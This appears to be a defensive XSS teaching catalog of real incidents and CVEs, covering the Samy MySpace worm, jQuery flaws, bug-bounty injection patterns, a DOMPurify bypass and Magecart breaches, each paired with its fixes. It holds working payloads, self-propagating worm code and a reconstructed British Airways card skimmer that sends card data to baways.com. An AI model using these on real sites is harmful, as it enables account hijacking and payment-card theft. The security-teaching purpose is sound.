SAMY WORMMySpace 2005
01
/* Samy Worm — simplified reconstruction (Samy Kamkar, 2005) */ /* Original bypassed MySpace's filter using CSS expression() in IE and java\nscript keyword split */ /* Modern equivalent of the propagation logic: */ <img src=x onerror=" (function(){ var x=new XMLHttpRequest(); x.open('GET','/profile/edit',true); x.onload=function(){ /* extract CSRF token */ var t=(x.responseText.match(/token.*?value=['\"]([\w]+)/)||[])[1]||''; var payload='<img src=x onerror=WORM_PAYLOAD>'; var body='csrf='+t+'&hero=samy&bio='+encodeURIComponent(payload); var y=new XMLHttpRequest(); y.open('POST','/profile/update',true); y.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); y.send(body); }; x.send(); })() ">
OriginSamy Kamkar's MySpace XSS worm, October 2005. Spread to 1 million profiles in ~20 hours. Original bypassCSS background:url('java\nscript:...') in IE; keyword "javascript" split across line boundary to bypass string filter; MySpace's filter matched exact string "javascript" Missing defenseOutput encoding on bio/hero fields; recursive keyword filter; rate limiting on profile updates Stopped byOutput encoding (html.escape) on profile display; CSP; rate limiting POST /profile/update What stopped itMySpace took the site offline, deleted infected profiles, and patched the encoding. Samy pled guilty to CFAA charges.

B. CVE-Derived Payloads
CVE-2020-11022jQuery
03
/* CVE-2020-11022/11023 — jQuery < 3.5.0 XSS via HTML manipulation */ /* Affected: $.html(), $.append(), $.prepend(), etc. when passed HTML strings */ /* Vulnerability: passing HTML with leading whitespace + selector to $() */ $('<option></option>').html('<img src=x onerror=alert(1)>'); /* or via $.append with crafted input: */ $('body').append('<script></script><img src=x onerror=alert(1)>'); /* Fix: jQuery 3.5.0 changed HTML parsing to strip dangerous patterns */ /* Affected jQuery versions: 1.0 - 3.4.x (basically everything old) */ /* Impact: any site using $().html($userInput) with jQuery < 3.5 */
CVECVE-2020-11022 and CVE-2020-11023 AffectedjQuery 1.2.0 – 3.4.1 — an enormous percentage of the web Root causejQuery's HTML manipulation methods parsed arbitrary HTML including scripts when passed strings containing <script> tags in specific positions Stopped byjQuery ≥ 3.5.0; never passing user input to $().html() or similar jQuery HTML methods; DOMPurify before passing to jQuery LessonA library function is a sink just like innerHTML. Passing user-controlled HTML to any jQuery manipulation method is equivalent to assigning to innerHTML.
CVE-2019-11358jQuery PP

/* CVE-2019-11358 — jQuery prototype pollution via $.extend(true, ...) */ /* jQuery < 3.4.0 */ var malicious = JSON.parse('{"__proto__":{"polluted":"yes"}}'); $.extend(true, {}, malicious); console.log({}.polluted); // "yes" — Object.prototype polluted /* XSS chain: poll Object.prototype.innerHTML, find jQuery gadget that reads it */ var payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'); $.extend(true, {}, payload); /* Any jQuery code that does $(element).html(config.innerHTML) where config = {} now fires */
CVECVE-2019-11358 — CVSS 6.1 Medium AffectedjQuery < 3.4.0. Patched by adding key check: if key === '__proto__' skip Root cause$.extend(true, …) deep merge processed __proto__ as a normal object key, writing to Object.prototype Stopped byjQuery ≥ 3.4.0; Object.freeze(Object.prototype); Trusted Types LessonPrototype pollution in a library you didn't write, exploited by a gadget elsewhere in your app. You may not have touched either file. CVE-2021-21224V8/Chrome

/* CVE-2021-21224 — V8 type confusion, exploited in the wild April 2021 */ /* This was a browser engine vulnerability, not an XSS payload per se */ /* Included here as an example of what a browser 0-day looks like in the wild */ /* The trigger pattern (simplified, not functional): */ /* Type confusion in V8's handling of 32-bit integer operations */ /* An attacker-controlled web page could trigger arbitrary code execution */ /* in the renderer process without any user interaction beyond visiting the page */ /* Real-world delivery: */ /* Embedded in iframe on compromised ad network → served to millions */ /* No XSS injection point needed — the browser itself was the vulnerability */ /* Defense: browser updates. A PhD in XSS defenses must acknowledge the browser engine layer as out-of-scope but acknowledge its existence.
C. Bug Bounty Report Patterns
BUG BOUNTYREFLECTED XSS
06
/* Common bug bounty pattern: search box XSS */ /* Endpoint: /search?q=USER_INPUT → reflected unencoded in: */ /* <input type="text" value="USER_INPUT"> */ /* Breaking out of attribute context: */ " autofocus onfocus=alert(document.domain) x=" /* Result in HTML: */ <input type="text" value="" autofocus onfocus=alert(document.domain) x=""> /* Alternative — break out entirely: */ "><img src=x onerror=alert(document.domain)><" /* No angle brackets needed for handler injection: */ " onmouseover="alert(1)
ContextSearch form — user input reflected into value="" attribute PatternM08 attribute injection — break out of attribute with " then inject event handler ImpactP1 in most bug bounty programs when on authenticated pages; P2 on unauthenticated Stopped byOutput encoding inside attribute: html.escape() converts " to &quot; — prevents attribute escape NoteThis is the most common real-world XSS pattern. Search boxes reflect the query into the page for display. The fix is a single line: html.escape(q) before insertion. The autofocus+onfocus variant fires immediately without any user interaction.
BUG BOUNTYSTORED XSS
07
/* Common stored XSS: display name / username field */ /* Attacker sets their display name to: */ <img src=x onerror=alert(document.domain)> /* This fires when any other user sees the attacker's name displayed: - in comments they wrote - in @ mentions - in friend/follower lists - in admin panels showing user lists - in emails/notifications showing the name */ /* High-value target: the admin panel display */ /* If an admin ever views a page with the attacker's name → admin-context XSS */ /* Admin has elevated permissions → CSRF token for privileged actions → escalation */
ContextUser profile display name — stored in DB, reflected in multiple views ImpactAffects every user who sees the display name; admin-context execution if admins view user lists Why it's commonly missedThe input form may sanitize, but the display contexts may be different endpoints. Bug: sanitize on input, not encode on output. Stopped byOutput encoding at every display point; template auto-escaping (Django, Jinja2, Rails all escape by default — the bug is when developers explicitly mark output as safe) NoteThe "mark as safe" pattern is the most common real-world stored XSS cause. Framework escapes by default. Developer marks output as "safe" or uses innerHTML or |safe filter — usually after doing their own (insufficient) sanitization. Output encoding by default + explicit opt-out at known-safe points.
BUG BOUNTYDOM XSS
08
/* Common bug bounty DOM XSS: error message via URL parameter */ /* App code: */ const msg = new URLSearchParams(location.search).get('error'); if (msg) { document.getElementById('flash').innerHTML = '<div class="error">' + msg + '</div>'; } /* Attack URL: */ /* /login?error=<img src=x onerror=alert(document.domain)> */ /* Server never touches this — /login?error= is passed to the client */ /* reflected XSS scanners targeting server responses miss this entirely */ /* Requires JavaScript-enabled DOM XSS scanner (DOM Invader, Burp DOM scanner) */
ContextLogin page flash message from URL parameter → innerHTML Why commonServer redirects to /login?error=Invalid+credentials after failed login. Devs put the error in the URL, display it via innerHTML — classic DOM XSS pattern DetectionStandard scanners miss this — must use DOM XSS scanner or manual review of client-side code Stopped bytextContent instead of innerHTML; DOMPurify; Trusted Types NoteFound in major platforms regularly. The fix is one word: change innerHTML to textContent. The error message is plain text — it never needs to be HTML. This is the most actionable single fix in DOM XSS: if you're displaying user-controlled text, use textContent.

MAGECARTBritish Airways 2018
09
/* British Airways Magecart skimmer — reconstructed from RiskIQ analysis */ /* 22 lines injected into Modernizr-like utility script on ba.com */ (function() { /* Wait for form submit */ document.querySelector('[name="paymentForm"]') .addEventListener('submit', function() { /* Harvest all form fields */ var formData = { name: document.querySelector('[name="cardName"]') ? document.querySelector('[name="cardName"]').value : '', number: document.querySelector('[name="cardNumber"]') ? document.querySelector('[name="cardNumber"]').value : '', expiry: document.querySelector('[name="expiryMonth"]') ? document.querySelector('[name="expiryMonth"]').value + '/' + document.querySelector('[name="expiryYear"]').value : '', cvv: document.querySelector('[name="cvvNumber"]') ? document.querySelector('[name="cvvNumber"]').value : '', email: document.querySelector('[name="email"]') ? document.querySelector('[name="email"]').value : '', origin: location.href }; /* Exfiltrate to lookalike domain */ new Image().src = 'https://baways.com/gateway/v1/cdn?' + Object.keys(formData) .map(k => encodeURIComponent(k) + '=' + encodeURIComponent(formData[k])) .join('&'); /* Don't cancel submit — real transaction proceeds, victim unaware */ }); })();
OriginBritish Airways breach, August–September 2018. ~500,000 customers' card details stolen. Attacker compromised a JavaScript utility file on BA's CDN. Attack typeSupply chain XSS — injected into a trusted third-party script (not BA's own code) Ran undetected for15 days. No BA-side monitoring detected the outbound traffic to baways.com. Missing defensesSRI on the compromised script; CSP connect-src blocking baways.com; outbound traffic monitoring; integrity checking of deployed JS files Stopped byintegrity="sha256-..." on the script tag; CSP connect-src 'self' https://ba.com blocking the exfil image request; outbound DNS/HTTP monitoring FineICO fined British Airways £20 million under GDPR (reduced from £183M initial notice).
MAGECARTTicketmaster 2018
10
/* Ticketmaster Magecart — Inbenta chat widget compromise */ /* Attacker compromised Inbenta Technologies, a chat support provider */ /* The compromise affected only Ticketmaster UK — Inbenta served custom JS per customer */ /* The compromised chat widget loaded: */ <script src="https://inbenta.ticketmaster.com/embed.js"></script> /* ↑ Same-origin for Ticketmaster UK. Once inbenta served malicious JS: */ /* The script had full same-origin access to the Ticketmaster payment page */ /* Pattern: third-party widget → compromised → payment page access */ /* Same skimmer structure as BA: listen for form submit → harvest card data → exfil */ /* The key difference from BA: */ /* Ticketmaster used a SUBDOMAIN of their domain for the third-party script */ /* (inbenta.ticketmaster.com) — this made the script same-origin with the payment page */ /* If served from inbenta.com (third-party domain) under different CSP it would be cross-origin */
OriginTicketmaster UK breach, April–June 2018. Discovered by RiskIQ. ~40,000 customers affected. Critical detailThe chat widget was hosted at inbenta.ticketmaster.com — a subdomain of ticketmaster.com — making it same-origin with the payment page. External CDN scripts on subdomains of your domain are same-origin. Missing defensesSRI on the Inbenta script; subresource integrity monitoring; third-party script auditing; CSP connect-src; CSP report-uri for anomaly detection Stopped byNever serving third-party scripts from your own subdomain; SRI; CSP; third-party JS security audit PhD angleThe subdomain hosting decision is the critical architectural mistake. Security architects should mandate that third-party scripts are served from third-party domains — never from subdomains of the main domain.

RESEARCHDOMPurify BYPASS
12
/* DOMPurify bypass — CVE-2019-20374 (fixed in 2.0.1) */ /* Researcher: Michał Bentkowski (Securitum) */ /* The bypass (simplified): */ <math><mtext> <table><mglyph> <style></style> </mglyph></table> </mtext></math> <img src=x onerror=alert(1)> /* Why it worked: DOMPurify serialized the sanitized DOM to HTML. The serialization produced a string that, when re-parsed via innerHTML, produced a different DOM tree with the img tag active. This is the definition of mXSS — the sanitizer was correct about what IT parsed. The browser's re-parse produced something different. */ /* Timeline: reported Dec 2019, patched in DOMPurify 2.0.1 Jan 2020 */ /* Lesson: even the best sanitizers can have mXSS vulnerabilities. Keep DOMPurify updated. SRI-pin the version you're using. */
CVECVE-2019-20374 — DOMPurify < 2.0.1 ResearchMichał Bentkowski, Securitum. Full write-up at research.securitum.com Root causeMathML mglyph element creates a context where style is raw text; serialization + re-parse in innerHTML produces different DOM (mXSS) Stopped byDOMPurify ≥ 2.0.1; CSP; Trusted Types (if policy uses the patched DOMPurify) PhD angleThis is the canonical example of Gap 1 from M18 — there is no formal, complete model of safe sanitization. DOMPurify is empirically excellent but not provably complete. The mXSS bypass was in production for an unknown period before discovery. A formal grammar-theoretic proof of sanitizer completeness would be a significant contribution.
